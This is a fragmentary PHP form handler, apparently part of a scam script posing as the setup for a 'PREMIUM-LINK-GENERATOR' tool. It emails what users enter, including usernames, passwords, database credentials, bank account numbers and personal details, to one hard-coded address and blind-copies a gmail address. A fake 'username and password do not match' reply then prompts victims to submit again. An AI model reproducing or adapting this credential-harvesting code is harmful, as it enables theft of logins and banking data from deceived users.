 ...
 */
    ...
    */   
   define('CC_FB_TO_EMAIL', 'conformation@server-to-server-linkgenerator.co.cc');
   /**
    ...
    */   
   define('CC_FB_BCC_EMAIL', 'plg.hasmee@gmail.com');
   /**
    ...
    */  
   define('CC_FB_AUTO_REPLY_SUBJECT', 'CONGRATULATIONS! FOR YOUR  PREMIUM-LINK-GENERATOR SETUP');   
   /**
   ...
   {      
      ...
      {      
         ...
         if(CC_FB_AUTO_REPLY)
         {
            $form_user_msg = parseMessage('CONGRATULATIONS! [Full Name] FOR YOUR  PREMIUM-LINK-GENERATOR SETUP.


Sorry to setup PREMIUM-LINK-GENERATOR completely. Because Username and Password does no match. You have entered Username as [Username] and Password as [Password]. Please recheck your Username and Password before submit again this PREMIUM-LINK-GENERATOR script.

------------------------------------------------------------------------------------------------------------------------------
YOUR FILLED UP DATA IS
-----------------------------------------------------------------------------------------------------------------------------
[Account For]
[Username]
[Password]
...
[DB User Name]
[DB Password]
[Security Day] [Security Month][Security Year]
[Postal Code]
[Bank Account No]
[Full Name]
[Country]
...
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
PLEASE DON’T REAPPLY THIS E-MAIL. THIS E-MAIL HAS BEE SENT FROM  PREMIUM-LINK-GENERATOR SERVER.', $preferences);
...
<body>
  <h2>Thank you for setup PREMIUM-LINK-GENERATOR!
Please check your e-mail to get PREMIUM-LINK-GENERATOR conformation mail and fallow the instructions.</h2>
</body></html>';
